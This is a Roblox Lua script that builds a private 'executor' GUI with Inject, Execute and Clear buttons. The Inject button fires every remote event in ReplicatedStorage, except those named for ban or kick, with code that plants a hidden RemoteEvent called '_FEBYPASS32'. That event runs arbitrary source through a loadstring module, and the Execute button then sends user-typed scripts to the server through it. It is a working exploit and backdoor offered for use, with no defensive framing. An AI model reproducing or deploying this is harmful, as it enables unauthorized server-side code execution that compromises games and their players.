local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local G2L = {}

G2L["ScreenGui"] = Instance.new("ScreenGui", playerGui)
G2L["ScreenGui"].Name = "DafUI"
CollectionService:AddTag(G2L["ScreenGui"], "main")

local Frame = Instance.new("Frame", G2L["ScreenGui"])
Frame.Size = UDim2.new(0.35, 0, 0.3, 0)
Frame.Position = UDim2.new(0.325, 0, 0.35, 0)
Frame.BackgroundColor3 = Color3.fromRGB(245, 245, 245) -- light background
Frame.BorderSizePixel = 1
Frame.BorderColor3 = Color3.fromRGB(200, 200, 200)
Frame.Active = true
Frame.Draggable = true

local title = Instance.new("TextLabel", Frame)
title.Size = UDim2.new(1, 0, 0.2, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(40, 40, 40)
title.TextScaled = true
title.Text = "Daf UI (Private)"
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

local outputBox = Instance.new("TextBox", Frame)
outputBox.ClearTextOnFocus = false
outputBox.MultiLine = true
outputBox.Size = UDim2.new(1, -20, 0.55, -10)
outputBox.Position = UDim2.new(0, 10, 0.2, 10)
outputBox.TextWrapped = true
outputBox.TextColor3 = Color3.fromRGB(30, 30, 30)
outputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
outputBox.BorderColor3 = Color3.fromRGB(200, 200, 200)
outputBox.PlaceholderText = "Enter your script here..."
outputBox.Font = Enum.Font.Code
outputBox.TextSize = 16

local function createButton(text, posX)
	local btn = Instance.new("TextButton", Frame)
	btn.BackgroundColor3 = Color3.fromRGB(0, 120, 215) -- professional blue
	btn.Size = UDim2.new(0, 100, 0, 40)
	btn.Position = UDim2.new(0, posX, 0, Frame.Size.Y.Scale * Frame.AbsoluteSize.Y - 50)
	btn.Font = Enum.Font.GothamSemibold
	btn.Text = text
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextScaled = true
	btn.BorderSizePixel = 0
	btn.TextWrapped = false
	return btn
end

local exec = createButton("Inject", 10)
local unfe = createButton("Execute", 120)
local clear = createButton("Clear", 230)

exec.MouseButton1Click:Connect(function()
	local function b_G_V12(see)
		local a = function(ree)
			ree:FireServer([[
				local folder = Instance.new('RemoteEvent')
				folder.Name = "_FEBYPASS32"
				folder.Parent = game:GetService("JointsService")
				local loadstring = require(13684410229)
				folder.OnServerEvent:Connect(function(_1,_2)
				   loadstring(_2)()
				end)
			]])
		end
		for i, v in pairs(see:GetChildren()) do
			if v:IsA("RemoteEvent") then
				if not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
					a(v)
				end
			end
			b_G_V12(v)
		end
	end
	b_G_V12(game:GetService("ReplicatedStorage"))
	local timetoken = 0
	local maxtime = 5
	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		exec.Text = "Injected"
		exec.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
	end
end)

unfe.MouseButton1Click:Connect(function()
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(outputBox.Text)
	else
		warn("Failed to loadstring: Error 404")
	end
end)

clear.MouseButton1Click:Connect(function()
	outputBox.Text = ""
end)

return G2L["ScreenGui"]
